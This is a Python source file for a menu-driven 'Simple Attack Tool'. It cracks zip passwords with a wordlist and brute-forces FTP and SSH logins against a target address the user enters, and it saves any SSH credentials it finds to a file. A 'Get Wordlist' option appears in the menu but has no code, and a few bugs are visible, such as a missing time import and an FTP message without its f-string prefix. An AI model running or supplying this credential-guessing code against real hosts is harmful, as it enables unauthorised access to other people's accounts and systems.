import os
from zipfile import ZipFile
from pathlib import Path
from tqdm import tqdm
import sys
from ftplib import FTP
import socket
import paramiko

os.system("cls")

print(r"""                         
.__           .__                         
|  |__   ____ |  |   _____   ____   ______
|  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
|   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
|___|  /\____/|____/__|_|  /\___  >____  >
     \/                  \/     \/     \/                                   
                             """)
print("\n****************************************************************")
print("\n* Simple Attack Tool                                           *")
print("\n****************************************************************")
respon = input("""\n Please enter tool of choice:
                1. Zip Unlocker
                2. Brute Force FTP
                3. Brute Force SSH Login
                4. Get Wordlist
Input the Number: """)
print("You have selected option: ", respon)

# ----------------------------------------------------------------------------------------------------------

if respon == '1':
    os.system("cls")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* Zip Unlocker                                                 *")
    print("\n****************************************************************\n")


    wordlist_path = Path(input('Enter path to the wordlist file > '))
    zip_path = Path(input('Enter path to zipped file      > '))

    def crack():
        zip_file = ZipFile(zip_path)

        with open(wordlist_path, 'rb') as file:
            pass_count = len(file.readlines())

        print(f'Total password to try: {pass_count:,}')

        with open(wordlist_path, 'rb') as file:
            for password in tqdm(file, total=pass_count, unit='Password'):
                try:
                    zip_file.extractall(pwd=password.strip())

                except:
                    continue

                else:
                    print(f'\nPassword found: {password.decode().strip()}')
                    exit(0)

        print('Password not found. Try a different wordlist')

    if wordlist_path.exists() and zip_path.exists():
        crack()
    else:
        print('Error : The path provided is incorrect or do not exist.')
        exit(1)

# ----------------------------------------------------------------------------------------------------------
if respon == '2':
    os.system("cls")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* FTP Brute Force                                              *")
    print("\n****************************************************************\n")

    def login(target, username, password):
        try:
            ftp = FTP(target)
            ftp.login(username, password)
            ftp.quit()
            print ("\n Found!")
            print("Username: {username} \nPassword: {password}")
        except:
            pass

    def bruteForce(target, username, wordlist):
        try:
            with wordlist.open("r") as f:
                words = f.readlines()
                for word in words:
                    word = word.strip()
                    login(target, username, word)
        except FileNotFoundError:
            print("\n There is no wordlist")
            sys.exit(0)

        except:
            print("\nAn error occured!")
            sys.exit(0)
            

    target = input('Enter IP Target > ')
    user = input('Enter Username > ')
    wordlist = Path(input('Enter path to wordlist file > '))

    bruteForce(target, user, wordlist)
    print("\n[+] Brute Force Finished")

# ----------------------------------------------------------------------------------------------------------
if respon == '3':
    os.system("cls")

    print(r"""                         
    .__           .__                         
    |  |__   ____ |  |   _____   ____   ______
    |  |  \ /  _ \|  |  /     \_/ __ \ /  ___/
    |   Y  (  <_> )  |_|  Y Y  \  ___/ \___ \ 
    |___|  /\____/|____/__|_|  /\___  >____  >
        \/                  \/     \/     \/                                   
                                """)
    print("\n****************************************************************")
    print("\n* SSH Login Brute Force                                        *")
    print("\n****************************************************************\n")

    def brute_force_ssh(target, user, wordlist_path):
        """Attempts to brute force SSH login using a wordlist."""
        port = 22
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        with open(wordlist_path) as file:
            passwords = file.read().splitlines()

        for password in passwords:
            try:
                ssh.connect(hostname=target, username=user, password=password, port=port, timeout=3)
            except socket.timeout:
                print(f"\nConnection timed out for host: {target}")
                continue
            except paramiko.AuthenticationException:
                print(f"[ATTEMPT] host: {target} - login: {user} - password: {password}")
            except paramiko.SSHException:
                print("Too many requests. Waiting for 2 minutes.")
                time.sleep(120)
                continue
            else:
                print(f"\n[Success] Host: {target} Login: {user} Password: {password}")
                with open("credentials.txt", "a") as file:
                    file.write(f'Host: {target}, Login: {user}, Password: {password}\n')
                break
        else:
            print(f"No valid credentials found in {wordlist_path}")

    def main():
        """Main function to gather inputs and start brute force."""
        os.system('clear')

        try:
            target = input('Enter Target Address > ')
            user = input('Enter Username > ')
            wordlist_path = Path(input('Enter path to Wordlist > '))

            if not wordlist_path.exists():
                print('The specified wordlist file does not exist.')
                sys.exit()
            
            brute_force_ssh(target, user, wordlist_path)

        except KeyboardInterrupt:
            print('\nExiting due to user interruption.\n')
            sys.exit()

    if __name__ == "__main__":
        main()
